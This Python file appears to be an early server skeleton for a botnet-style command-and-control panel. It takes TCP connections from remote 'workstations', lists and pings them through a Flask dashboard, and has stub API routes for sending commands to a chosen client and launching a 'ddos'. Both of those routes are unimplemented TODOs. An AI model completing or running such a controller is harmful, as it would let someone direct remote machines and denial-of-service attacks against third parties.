from socket import *
import threading
from functions import Client
import time
from flask import Flask, jsonify, send_from_directory

def clients_manager(server, mng):
    while True:
        client, addr = server.accept()
        mng.addWorkstation(client, addr)

app = Flask(__name__)

clientmng = Client()  # Creating class instance

@app.route('/')
def index():
    return send_from_directory('website', 'index.html')

@app.route('/<path:path>')
def static_files(path):
    return send_from_directory('website', path)

@app.route('/api/clients')
def api_clients():
    clients = clientmng.get_work_stations()
    clients_json = []
    for client in clients:
        clients_json.append(client.to_json())

    return jsonify(clients_json)

@app.route('/api/ping')
def api_ping():
    clientmng.ping_all_clients()
    return "OK"


@app.route('/api/command/<string:client_ip>')
def api_command(client_ip):
    # TODO Implement send_command
    # clientmng.send_command(client_ip, "command")
    return jsonify({"OK": True})

@app.route('/api/ddos')
def api_ddos():
    # TODO Implement ddos
    return jsonify({"OK": True})

# TODO add thread to ping all clients every X amount of time

def main():
    server = socket(AF_INET, SOCK_STREAM)  # setting up the connection
    server.bind(("", 3333))
    server.listen(100)
    print("LOADING..")
    thread = threading.Thread(target=clients_manager, args=(server, clientmng))
    thread.daemon = True
    thread.start()  # Starting parallel thread to accept clients
    time.sleep(10)
    ping_thread = threading.Thread(target=clientmng.ping_refresh,)
    ping_thread.daemon = True
    ping_thread.start()
    app.run(host='0.0.0.0', port=5000)


if __name__ == "__main__":
    main()